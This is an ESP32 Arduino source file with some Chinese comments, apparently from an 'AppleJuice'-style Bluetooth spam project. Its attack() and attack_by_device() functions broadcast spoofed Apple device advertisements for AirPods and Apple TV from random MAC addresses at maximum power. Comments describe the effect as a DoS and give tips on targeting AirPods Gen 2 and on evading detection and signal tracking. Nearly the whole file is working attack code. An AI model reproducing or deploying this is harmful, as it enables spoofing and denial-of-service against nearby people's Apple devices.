#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_arduino_version.h>
#include <Adafruit_NeoPixel.h>
#include "devices.hpp"

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif
#define LED_PIN 48         // 板载RGB灯珠的引脚，根据实际使用的开发板型号而定
#define LED_COUNT 1         // LED灯条的灯珠数量（板载的是一颗）

/*
使用 Adafruit_NeoPixel 库创建了一个名为 strip 的对象，控制LED灯珠
LED_COUNT 表示 LED 条上的 LED 数量，LED_PIN 表示连接到 Arduino 的引脚，NEO_GRB + NEO_KHZ800 用于设置 LED 条的颜色排列和通信速率
*/ 
Adafruit_NeoPixel strip(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);

BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 800;



int flag=1;//显示状态
int i=0;
void applejuice_init(){
  Serial.begin(115200);
     
    Serial.println("Starting ESP32 BLE");
    strip.begin();
    strip.setBrightness(5); // 设置亮度（0-255范围）
    // This is specific to the AirM2M ESP32 board
    // https://wiki.luatos.com/chips/esp32c3/board.html
    pinMode(12, OUTPUT);
    pinMode(13, OUTPUT);
    
    BLEDevice::init("AirPods 69");

    // Increase the BLE Power to 21dBm (MAX)
    // https://docs.espressif.com/projects/esp-idf/en/stable/esp32c3/api-reference/bluetooth/controller_vhci.html
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    // Create the BLE Server
    BLEServer *pServer = BLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();

    // seems we need to init it with an address in setup() step.
    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}
void attack() {
  // Turn lights on during "busy" part
  digitalWrite(12, HIGH);
  digitalWrite(13, HIGH);
  switch (i)
  {
  case 0/* constant-expression */:
    
    strip.setPixelColor(0, strip.Color(255, 0, 0)); // 设置灯珠为绿色 (R, G, B)
    break;
  case 1:
    strip.setPixelColor(0, strip.Color(0, 255, 0));
    break;
  case 2:
    strip.setPixelColor(0, strip.Color(0, 0, 255));
    i=-1;
    break;
  default:
    break;
  }
  i++;
	strip.show(); // 显示颜色

  // First generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we 
    // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Randomly pick data from one of the devices
  // First decide short or long
  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
  int device_choice = random(2);
  if (device_choice == 0){
    int index = random(17);
    #ifdef ESP_ARDUINO_VERSION_MAJOR
      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)DEVICES[index], 31));
      #else
          oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
      #endif
    #endif
  } else {
    int index = random(13);
    #ifdef ESP_ARDUINO_VERSION_MAJOR
      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
      #else
          oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
      #endif
    #endif
  }

/*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
      the three advertising PDU types when you want to connect to Apple devices.
          // 0 = ADV_TYPE_IND, 
          // 1 = ADV_TYPE_SCAN_IND
          // 2 = ADV_TYPE_NONCONN_IND
      
      Randomly using any of these PDU types may increase detectability of spoofed packets. 

      What we know for sure:
      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
  */
  
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // Set the device address, advertisement data
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // Set advertising interval
  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
      
      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
  */

  //pAdvertising->setMinInterval(0x20);
  //pAdvertising->setMaxInterval(0x20);
  //pAdvertising->setMinPreferred(0x20);
  //pAdvertising->setMaxPreferred(0x20);

  // Start advertising
  Serial.println("Sending Advertisement...");
  pAdvertising->start();

  // Turn lights off while "sleeping"
  digitalWrite(12, LOW);
  digitalWrite(13, LOW);
  delay(delayMilliseconds); // delay for delayMilliseconds ms
  pAdvertising->stop();

  // Random signal strength increases the difficulty of tracking the signal
  int rand_val = random(100);  // Generate a random number between 0 and 99
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  
  // if (rand_val < 70) {  // 70% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  // } else if (rand_val < 85) {  // 15% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
  // } else if (rand_val < 95) {  // 10% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
  // } else if (rand_val < 99) {  // 4% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
  // } else {  // 1% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
  // }
}

void attack_by_device(int device_num) {
  // Turn lights on during "busy" part
  digitalWrite(12, HIGH);
  digitalWrite(13, HIGH);
  switch (i)
  {
  case 0/* constant-expression */:
    
    strip.setPixelColor(0, strip.Color(255, 0, 0)); // 设置灯珠为绿色 (R, G, B)
    break;
  case 1:
    strip.setPixelColor(0, strip.Color(0, 255, 0));
    break;
  case 2:
    strip.setPixelColor(0, strip.Color(0, 0, 255));
    i=-1;
    break;
  default:
    break;
  }
  i++;
	strip.show(); // 显示颜色

  // First generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we 
    // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Randomly pick data from one of the devices
  // First decide short or long
  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)

    int index = device_num;
    #ifdef ESP_ARDUINO_VERSION_MAJOR
      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)DEVICES[index], 31));
      #else
          oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
      #endif
    #endif
    //long (headphones)
    // #ifdef ESP_ARDUINO_VERSION_MAJOR
    //   #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
    //       oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
    //   #else
    //       oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
    //   #endif// short (misc stuff like Apple TV)
    // #endif
  

/*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
      the three advertising PDU types when you want to connect to Apple devices.
          // 0 = ADV_TYPE_IND, 
          // 1 = ADV_TYPE_SCAN_IND
          // 2 = ADV_TYPE_NONCONN_IND
      
      Randomly using any of these PDU types may increase detectability of spoofed packets. 

      What we know for sure:
      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
  */
  
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // Set the device address, advertisement data
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // Set advertising interval
  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
      
      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
  */

  //pAdvertising->setMinInterval(0x20);
  //pAdvertising->setMaxInterval(0x20);
  //pAdvertising->setMinPreferred(0x20);
  //pAdvertising->setMaxPreferred(0x20);

  // Start advertising
  Serial.println("Sending Advertisement...");
  pAdvertising->start();

  // Turn lights off while "sleeping"
  digitalWrite(12, LOW);
  digitalWrite(13, LOW);
  delay(delayMilliseconds); // delay for delayMilliseconds ms
  pAdvertising->stop();

  // Random signal strength increases the difficulty of tracking the signal
  int rand_val = random(100);  // Generate a random number between 0 and 99
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  
  // if (rand_val < 70) {  // 70% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  // } else if (rand_val < 85) {  // 15% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
  // } else if (rand_val < 95) {  // 10% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
  // } else if (rand_val < 99) {  // 4% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
  // } else {  // 1% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
  // }
}